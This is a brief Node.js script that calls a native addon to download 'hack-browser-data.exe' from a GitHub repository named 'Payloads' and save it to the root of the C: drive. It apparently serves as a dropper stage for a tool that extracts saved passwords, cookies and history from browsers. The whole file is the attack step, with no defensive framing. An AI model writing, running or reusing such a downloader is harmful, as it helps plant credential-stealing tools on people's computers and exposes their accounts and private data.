const addon = require('./build/Release/addon');

const url = 'https://github.com/Endizz/Payloads/raw/refs/heads/main/hack-browser-data.exe';
const outputPath = 'c:\hack-browser-data.exe';

try {
  console.log('Starting download...');
  const result = addon.downloadFile(url, outputPath);
  console.log(result);
} catch (err) {
  console.error('Error:', err.message);
}